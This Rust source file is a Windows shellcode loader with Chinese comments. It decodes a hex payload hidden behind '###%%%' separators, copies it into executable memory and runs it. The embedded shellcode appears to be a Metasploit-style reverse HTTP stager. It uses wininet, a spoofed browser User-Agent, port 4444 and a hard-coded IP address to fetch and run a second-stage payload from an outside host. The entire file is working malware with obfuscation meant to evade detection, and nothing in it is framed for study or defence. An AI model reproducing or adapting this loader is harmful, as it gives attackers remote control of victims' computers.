use std::mem;
use winapi::um::memoryapi::{VirtualAlloc, VirtualProtect};
use winapi::um::winnt::{MEM_COMMIT, PAGE_EXECUTE_READWRITE};
use hex;
fn StrToU8Array(str : &str) -> Vec<u8> {

    let hex_string = str.replace("###%%%", "");
    let bytes = hex::decode(hex_string).unwrap();
    let result = bytes.as_slice();
    // println!("{:?}", result);
    result.to_vec()
}
fn main() {
    // StrToU8Array();
    // 使用u8数组表示shellcode
    let shellcode = StrToU8Array("###%%%fc###%%%48###%%%83###%%%e4###%%%f0###%%%e8###%%%c8###%%%00###%%%00###%%%00###%%%41###%%%51###%%%41###%%%50###%%%52###%%%51###%%%56###%%%48###%%%31###%%%d2###%%%65###%%%48###%%%8b###%%%52###%%%60###%%%48###%%%8b###%%%52###%%%18###%%%48###%%%8b###%%%52###%%%20###%%%48###%%%8b###%%%72###%%%50###%%%48###%%%0f###%%%b7###%%%4a###%%%4a###%%%4d###%%%31###%%%c9###%%%48###%%%31###%%%c0###%%%ac###%%%3c###%%%61###%%%7c###%%%02###%%%2c###%%%20###%%%41###%%%c1###%%%c9###%%%0d###%%%41###%%%01###%%%c1###%%%e2###%%%ed###%%%52###%%%41###%%%51###%%%48###%%%8b###%%%52###%%%20###%%%8b###%%%42###%%%3c###%%%48###%%%01###%%%d0###%%%66###%%%81###%%%78###%%%18###%%%0b###%%%02###%%%75###%%%72###%%%8b###%%%80###%%%88###%%%00###%%%00###%%%00###%%%48###%%%85###%%%c0###%%%74###%%%67###%%%48###%%%01###%%%d0###%%%50###%%%8b###%%%48###%%%18###%%%44###%%%8b###%%%40###%%%20###%%%49###%%%01###%%%d0###%%%e3###%%%56###%%%48###%%%ff###%%%c9###%%%41###%%%8b###%%%34###%%%88###%%%48###%%%01###%%%d6###%%%4d###%%%31###%%%c9###%%%48###%%%31###%%%c0###%%%ac###%%%41###%%%c1###%%%c9###%%%0d###%%%41###%%%01###%%%c1###%%%38###%%%e0###%%%75###%%%f1###%%%4c###%%%03###%%%4c###%%%24###%%%08###%%%45###%%%39###%%%d1###%%%75###%%%d8###%%%58###%%%44###%%%8b###%%%40###%%%24###%%%49###%%%01###%%%d0###%%%66###%%%41###%%%8b###%%%0c###%%%48###%%%44###%%%8b###%%%40###%%%1c###%%%49###%%%01###%%%d0###%%%41###%%%8b###%%%04###%%%88###%%%48###%%%01###%%%d0###%%%41###%%%58###%%%41###%%%58###%%%5e###%%%59###%%%5a###%%%41###%%%58###%%%41###%%%59###%%%41###%%%5a###%%%48###%%%83###%%%ec###%%%20###%%%41###%%%52###%%%ff###%%%e0###%%%58###%%%41###%%%59###%%%5a###%%%48###%%%8b###%%%12###%%%e9###%%%4f###%%%ff###%%%ff###%%%ff###%%%5d###%%%6a###%%%00###%%%49###%%%be###%%%77###%%%69###%%%6e###%%%69###%%%6e###%%%65###%%%74###%%%00###%%%41###%%%56###%%%49###%%%89###%%%e6###%%%4c###%%%89###%%%f1###%%%41###%%%ba###%%%4c###%%%77###%%%26###%%%07###%%%ff###%%%d5###%%%48###%%%31###%%%c9###%%%48###%%%31###%%%d2###%%%4d###%%%31###%%%c0###%%%4d###%%%31###%%%c9###%%%41###%%%50###%%%41###%%%50###%%%41###%%%ba###%%%3a###%%%56###%%%79###%%%a7###%%%ff###%%%d5###%%%eb###%%%73###%%%5a###%%%48###%%%89###%%%c1###%%%41###%%%b8###%%%5c###%%%11###%%%00###%%%00###%%%4d###%%%31###%%%c9###%%%41###%%%51###%%%41###%%%51###%%%6a###%%%03###%%%41###%%%51###%%%41###%%%ba###%%%57###%%%89###%%%9f###%%%c6###%%%ff###%%%d5###%%%eb###%%%59###%%%5b###%%%48###%%%89###%%%c1###%%%48###%%%31###%%%d2###%%%49###%%%89###%%%d8###%%%4d###%%%31###%%%c9###%%%52###%%%68###%%%00###%%%02###%%%40###%%%84###%%%52###%%%52###%%%41###%%%ba###%%%eb###%%%55###%%%2e###%%%3b###%%%ff###%%%d5###%%%48###%%%89###%%%c6###%%%48###%%%83###%%%c3###%%%50###%%%6a###%%%0a###%%%5f###%%%48###%%%89###%%%f1###%%%48###%%%89###%%%da###%%%49###%%%c7###%%%c0###%%%ff###%%%ff###%%%ff###%%%ff###%%%4d###%%%31###%%%c9###%%%52###%%%52###%%%41###%%%ba###%%%2d###%%%06###%%%18###%%%7b###%%%ff###%%%d5###%%%85###%%%c0###%%%0f###%%%85###%%%9d###%%%01###%%%00###%%%00###%%%48###%%%ff###%%%cf###%%%0f###%%%84###%%%8c###%%%01###%%%00###%%%00###%%%eb###%%%d3###%%%e9###%%%e4###%%%01###%%%00###%%%00###%%%e8###%%%a2###%%%ff###%%%ff###%%%ff###%%%2f###%%%58###%%%59###%%%32###%%%7a###%%%00###%%%9a###%%%dd###%%%af###%%%72###%%%70###%%%67###%%%7e###%%%07###%%%d1###%%%09###%%%da###%%%39###%%%83###%%%86###%%%6d###%%%74###%%%d0###%%%93###%%%f6###%%%0f###%%%63###%%%7c###%%%ba###%%%e9###%%%9d###%%%e3###%%%2d###%%%72###%%%99###%%%ae###%%%e2###%%%df###%%%04###%%%2d###%%%46###%%%da###%%%12###%%%ee###%%%0f###%%%50###%%%86###%%%c1###%%%06###%%%6a###%%%5a###%%%fd###%%%f0###%%%54###%%%41###%%%8d###%%%3e###%%%80###%%%58###%%%90###%%%6a###%%%6a###%%%7d###%%%87###%%%12###%%%ed###%%%63###%%%fa###%%%78###%%%52###%%%3b###%%%0c###%%%0f###%%%bf###%%%6a###%%%73###%%%0b###%%%9f###%%%91###%%%00###%%%55###%%%73###%%%65###%%%72###%%%2d###%%%41###%%%67###%%%65###%%%6e###%%%74###%%%3a###%%%20###%%%4d###%%%6f###%%%7a###%%%69###%%%6c###%%%6c###%%%61###%%%2f###%%%34###%%%2e###%%%30###%%%20###%%%28###%%%63###%%%6f###%%%6d###%%%70###%%%61###%%%74###%%%69###%%%62###%%%6c###%%%65###%%%3b###%%%20###%%%4d###%%%53###%%%49###%%%45###%%%20###%%%38###%%%2e###%%%30###%%%3b###%%%20###%%%57###%%%69###%%%6e###%%%64###%%%6f###%%%77###%%%73###%%%20###%%%4e###%%%54###%%%20###%%%36###%%%2e###%%%31###%%%3b###%%%20###%%%54###%%%72###%%%69###%%%64###%%%65###%%%6e###%%%74###%%%2f###%%%34###%%%2e###%%%30###%%%29###%%%0d###%%%0a###%%%00###%%%a2###%%%dc###%%%21###%%%6c###%%%a7###%%%cc###%%%0a###%%%41###%%%49###%%%31###%%%a9###%%%ae###%%%0a###%%%53###%%%a0###%%%cf###%%%08###%%%93###%%%c5###%%%ae###%%%1d###%%%b4###%%%2b###%%%12###%%%97###%%%e2###%%%92###%%%f2###%%%d4###%%%d6###%%%b8###%%%c5###%%%46###%%%d5###%%%e6###%%%48###%%%39###%%%60###%%%a9###%%%6f###%%%85###%%%a2###%%%f8###%%%5e###%%%c6###%%%ea###%%%c1###%%%ed###%%%38###%%%ac###%%%19###%%%d9###%%%ef###%%%4b###%%%4b###%%%88###%%%4d###%%%56###%%%ef###%%%2e###%%%75###%%%1e###%%%30###%%%a0###%%%46###%%%7d###%%%a5###%%%47###%%%a2###%%%a8###%%%61###%%%e4###%%%4e###%%%43###%%%66###%%%88###%%%c8###%%%7b###%%%bf###%%%d6###%%%0d###%%%03###%%%b3###%%%93###%%%bf###%%%a3###%%%20###%%%54###%%%21###%%%cf###%%%0c###%%%72###%%%37###%%%71###%%%06###%%%89###%%%78###%%%2c###%%%e3###%%%31###%%%c4###%%%2e###%%%69###%%%87###%%%3a###%%%d7###%%%2f###%%%75###%%%f2###%%%2c###%%%b3###%%%c1###%%%40###%%%66###%%%7b###%%%94###%%%94###%%%e1###%%%7c###%%%b3###%%%fc###%%%78###%%%3c###%%%6f###%%%05###%%%bd###%%%e5###%%%72###%%%3a###%%%05###%%%4b###%%%d7###%%%9e###%%%06###%%%68###%%%c5###%%%d4###%%%d3###%%%2c###%%%4b###%%%71###%%%f8###%%%8f###%%%81###%%%ae###%%%30###%%%b9###%%%6f###%%%13###%%%83###%%%79###%%%3d###%%%8c###%%%00###%%%b8###%%%59###%%%1f###%%%14###%%%b2###%%%f1###%%%dc###%%%bd###%%%42###%%%0a###%%%50###%%%24###%%%d2###%%%82###%%%a9###%%%54###%%%5f###%%%c0###%%%58###%%%3e###%%%ae###%%%b6###%%%aa###%%%97###%%%a9###%%%54###%%%90###%%%12###%%%0b###%%%05###%%%40###%%%10###%%%5f###%%%10###%%%d5###%%%f6###%%%8d###%%%e7###%%%e2###%%%d9###%%%f7###%%%77###%%%46###%%%c1###%%%d1###%%%c0###%%%51###%%%4d###%%%6e###%%%8b###%%%82###%%%9b###%%%e6###%%%2f###%%%be###%%%8e###%%%1b###%%%5c###%%%e3###%%%7f###%%%b6###%%%ac###%%%e1###%%%7f###%%%0b###%%%1e###%%%94###%%%27###%%%01###%%%58###%%%5f###%%%00###%%%41###%%%be###%%%f0###%%%b5###%%%a2###%%%56###%%%ff###%%%d5###%%%48###%%%31###%%%c9###%%%ba###%%%00###%%%00###%%%40###%%%00###%%%41###%%%b8###%%%00###%%%10###%%%00###%%%00###%%%41###%%%b9###%%%40###%%%00###%%%00###%%%00###%%%41###%%%ba###%%%58###%%%a4###%%%53###%%%e5###%%%ff###%%%d5###%%%48###%%%93###%%%53###%%%53###%%%48###%%%89###%%%e7###%%%48###%%%89###%%%f1###%%%48###%%%89###%%%da###%%%41###%%%b8###%%%00###%%%20###%%%00###%%%00###%%%49###%%%89###%%%f9###%%%41###%%%ba###%%%12###%%%96###%%%89###%%%e2###%%%ff###%%%d5###%%%48###%%%83###%%%c4###%%%20###%%%85###%%%c0###%%%74###%%%b6###%%%66###%%%8b###%%%07###%%%48###%%%01###%%%c3###%%%85###%%%c0###%%%75###%%%d7###%%%58###%%%58###%%%58###%%%48###%%%05###%%%00###%%%00###%%%00###%%%00###%%%50###%%%c3###%%%e8###%%%9f###%%%fd###%%%ff###%%%ff###%%%33###%%%39###%%%2e###%%%31###%%%30###%%%37###%%%2e###%%%32###%%%33###%%%39###%%%2e###%%%33###%%%30###%%%00###%%%12###%%%34###%%%56###%%%78");
    // 调用VirtualAlloc函数分配可执行内存
    let exec = unsafe { VirtualAlloc(0 as _, shellcode.len(), MEM_COMMIT, PAGE_EXECUTE_READWRITE) };
    // 把shellcode拷贝到分配的内存中
    unsafe {
        let ptr = exec as *mut u8;
        std::ptr::copy_nonoverlapping(shellcode.as_ptr(), ptr, shellcode.len());
    }
    // 把可执行内存的属性设置为可执行
    let mut old_protect: u32 = 0;
    let result = unsafe {
        winapi::um::memoryapi::VirtualProtect(
            exec as _,
            shellcode.len(),
            PAGE_EXECUTE_READWRITE,
            &mut old_protect,
        )
    };
    if result == 0 {
        panic!("VirtualProtect failed with error code {}", std::io::Error::last_os_error());
    }
    // 把内存中的shellcode当做函数执行
    let f: fn() -> () = unsafe { mem::transmute(exec) };
    f();
    // 释放内存
    let result = unsafe { winapi::um::memoryapi::VirtualFree(exec, 0, winapi::um::winnt::MEM_RELEASE) };
    if result == 0 {
        panic!("VirtualFree failed with error code {}", std::io::Error::last_os_error());
    }
}
